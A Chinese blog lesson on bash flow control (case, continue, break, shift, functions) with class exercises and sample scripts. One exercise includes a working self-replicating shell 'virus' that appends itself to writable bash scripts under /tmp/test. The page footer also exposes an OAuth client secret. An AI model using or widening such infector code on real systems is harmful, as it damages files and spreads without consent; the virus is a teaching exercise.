+<h3 id="case-语法格式"><a href="#case-语法格式" class="headerlink" title="case 语法格式"></a>case 语法格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">case 取值 in</span><br><span class="line">取值 1)</span><br><span class="line">	CMD1 ;</span><br><span class="line">	cmd11;</span><br><span class="line">	cmd12;;</span><br><span class="line">取值 2)</span><br><span class="line">	CMD2 ;;</span><br><span class="line">取值 3)</span><br><span class="line">	CMD3 ;;</span><br><span class="line">*)</span><br><span class="line">	CMD4 ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+<p>* 代表除了以上所有的取值 , 做某一些操作</p>
+<h4 id="课堂练习-3"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
+<li>请问你是否喜欢shell脚本？ 如果你回答yes，则程序退出，否则永远会问你是否喜欢shell脚本？</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]# cat 1.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">read -p "请问你是否喜欢shell脚本？" an</span><br><span class="line">until [ $an = yes ]</span><br><span class="line">do</span><br><span class="line">case $an in</span><br><span class="line">yes)</span><br><span class="line">	exit;;</span><br><span class="line">*)</span><br><span class="line">	read -p "请问你是否喜欢shell脚本？" an;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？no</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？iii</span><br><span class="line">请问你是否喜欢shell脚本？fuck you</span><br><span class="line">1.sh: line 4: [: too many arguments</span><br><span class="line">请问你是否喜欢shell脚本？...</span><br><span class="line">请问你是否喜欢shell脚本？^^^[[D</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="continue-语法格式"><a href="#continue-语法格式" class="headerlink" title="continue 语法格式"></a>continue 语法格式</h3><pre><code>continue 作用于循环语句中 代表跳出这个循环进入下个循环 .</code></pre><h4 id="课堂练习-4"><a href="#课堂练习-4" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="2">
+<li>要求输出100以下所有能够被7整除，但不能够被5整除的数字。（并在一行输出）</li>
+</ol>
+<h3 id="break-语法格式"><a href="#break-语法格式" class="headerlink" title="break 语法格式"></a>break 语法格式</h3><pre><code>break 作用于循环语句中 代表直接跳出该循环 .</code></pre><h4 id="课堂练习-5"><a href="#课堂练习-5" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="3">
+<li>要求找出系统中属于student用户的一个文件.</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat file.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `find / -user student 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">	<span class="built_in">break</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="shift-语法格式"><a href="#shift-语法格式" class="headerlink" title="shift 语法格式"></a>shift 语法格式</h3><pre><code>位置参数</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">   $</span><span class="bash">1 代表的是输入的第一个参数</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 代表的是输入的第二个参数 ....</span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 代表的是 bash 程序本身名</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># 代表的是参数的个数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;10&#125; 超过的两位的</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;*&#125;或者<span class="variable">$&#123;@&#125;</span> 代表将所有位置参数</span></span><br><span class="line">shift 代表移走第一位位置参数 , 由后续的位置参数前移一位 .</span><br></pre></td></tr></table></figure>
+<h4 id="课堂练习-6"><a href="#课堂练习-6" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="4">
+<li>显示位置参数的值，以及可执行脚本名称，参数的总数</li>
+</ol>
+<h3 id="function-语法格式"><a href="#function-语法格式" class="headerlink" title="function 语法格式"></a>function 语法格式</h3><pre><code>functname ()
+{
+shell commands
+}</code></pre><ul>
+<li><p>函数的调用</p>
+<ol>
+<li>直接调用函数– 函数名</li>
+<li>传入参数– 函数名 参数1 参数2 参数3</li>
+<li>使用return返回函数结束状态</li>
+</ol>
+</li>
+<li><p>函数中的局部变量和全局变量</p>
+</li>
+</ul>
+<p>默认为全局变量，因此不同的函数不可以使用同一个变量；<br>如果要变成局部变量，需要使用local来修饰，那么不同的函数就不能访问到这个局部变量。</p>
+<ul>
+<li>函数返回值 return<br>可以使用return命令来设置返回值；</li>
+</ul>
+<p>例如 return 0</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#### 课堂练习</span></span><br><span class="line"></span><br><span class="line">5. 创建一个命令booboo，命令用法如下：</span><br><span class="line">booboo -t 30s 	代表睡30s；即-t后跟时间</span><br><span class="line">booboo -l /tmp  代表显示某个目录下面的内容和属性以及目录本身的属性</span><br><span class="line">booboo -r /tmp/file 代表删除某个文件</span><br><span class="line">booboo --<span class="built_in">help</span>	代表帮助信息显示该命令的用法</span><br><span class="line"></span><br><span class="line">6. 输入你的出生日期，程序会告诉你距离你下一个生日还有几天？</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat booboo</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">	sleep <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIR ()</span><br><span class="line">&#123;</span><br><span class="line">	ls -l <span class="variable">$1</span></span><br><span class="line">	ls -ld <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RM ()</span><br><span class="line">&#123;</span><br><span class="line">	rm -rf <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">-t)</span><br><span class="line">	SLEEP <span class="variable">$2</span>;;</span><br><span class="line">-l)</span><br><span class="line">	DIR <span class="variable">$2</span>;;</span><br><span class="line">-r)</span><br><span class="line">	RM <span class="variable">$2</span>;;</span><br><span class="line">--<span class="built_in">help</span>)</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line">*)</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line">[root@client0 ~]<span class="comment"># ./booboo -t 3s</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>使用bash写一个脚本实现以下功能：</p>
+<p>1) -r 查看系统发行版本<br>2) -k 查看系统内核版本<br>3) -d 查看系统磁盘信息<br>4) -u 查看当前系统用户<br>5) -t 查看系统运行时间<br>6) -s 查看selinux状态<br>7) -f 查看内存信息<br>8) -n 查看网络信息<br>9) -a 实现以上所有功能<br>10）–help 查看帮助</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">REL () &#123;</span><br><span class="line">cat /etc/redhat-release	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KER () &#123;</span><br><span class="line">uname -a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIS () &#123;</span><br><span class="line">df -h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">USR () &#123;</span><br><span class="line">who</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UPT () &#123;</span><br><span class="line">uptime</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SEL () &#123;</span><br><span class="line">getenforce</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FER () &#123;</span><br><span class="line">free -m</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NET () &#123;</span><br><span class="line">ifconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-r)</span><br><span class="line">	REL;;	</span><br><span class="line">-k)</span><br><span class="line">	KER;;</span><br><span class="line">-d)</span><br><span class="line">	DIS;;</span><br><span class="line">-u)</span><br><span class="line">	USR;;</span><br><span class="line">-t)</span><br><span class="line">	UPT;;</span><br><span class="line">-s)</span><br><span class="line">	SEL;;</span><br><span class="line">-f)	</span><br><span class="line">	FER;;</span><br><span class="line">-n)</span><br><span class="line">	NET;;</span><br><span class="line">-a)</span><br><span class="line">	REL;KER;DIS;USR;UPT;SEL;FER;NET;;</span><br><span class="line">--help)</span><br><span class="line">	echo "this is help"</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+<hr>
+<p>用shell脚本写一个病毒，要求如下：</p>
+<ol>
+<li>可以感染系统中的所有Bourne-Again shell script的脚本,可执行，可写；</li>
+<li>执行感染后的bash shell脚本会输出”echo hello,I am evil!”</li>
+<li>如果已经被感染，就不再感染</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep "Bourne-Again shell script" &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi</span><br></pre></td></tr></table></figure>
+<hr>
+<p>如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">        echo "now sleep"</span><br><span class="line">        sleep $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-s)</span><br><span class="line">        SLEEP $2;;</span><br><span class="line">*)</span><br><span class="line">        exit;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 rgweiyaping@hotmail.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>LINUX Shell Scripts 第二课 流程控制语句</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">3.4k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="BoobooWei">BoobooWei</a></p>
+    <p><span class="copy-title">发布时间:</span>2016-12-22, 21:06:27</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-24, 05:15:44</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/" title="LINUX Shell Scripts 第二课 流程控制语句">http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+    <div id="comments"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<script type="text/javascript">
+    $.getScript('/js/gitalk.js', function () {
+        var gitalk = new Gitalk({
+            clientID: 'af999a0c30ad557db57d',
+            clientSecret: 'e8187ce46941faf83cd26f8d53e40f2cd63900a9',
+            repo: 'booboowei.github.io',
+            owner: 'booboowei',
+            admin: ['booboowei'],
+            id: decodeURI(location.pathname),
+            distractionFreeMode: 'true',
+            language: 'zh-CN',
+            perPage: parseInt('10',10)
+        })
+        gitalk.render('comments')
+    })
+</script>
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2018-2020 BoobooWei</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#宝宝成长','#培训','#Linux基础服务','#Linux','#数据救援','#hexo','#SQL优化','#锁故障','#RDS','#主从同步','#LinuxBash脚本',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+        /* 渲染*/
+        function HTMLDecode(text) {
+            var temp = document.createElement("div");
+            temp.innerHTML = text;
+            var output = temp.innerText || temp.textContent;
+            temp = null;
+            return output;
+        }
+        if (window.mermaid){
+            window.mermaid = null
+        }
+        $.getScript("//cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js", function () {
+            var mermaidOptions = JSON.parse(HTMLDecode("{&#34;theme&#34;:&#34;default&#34;,&#34;startOnLoad&#34;:true,&#34;flowchart&#34;:{&#34;useMaxWidth&#34;:false,&#34;htmlLabels&#34;:true}}"))
+            if (window.mermaid) {
+                mermaid.initialize(mermaidOptions)
+                mermaid.contentLoaded()
+            }
+        })
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 622px;
+    }
+    .nav.fullscreen {
+        margin-left: -622px;
+    }
+    .nav-left {
+        width: 200px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.2;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
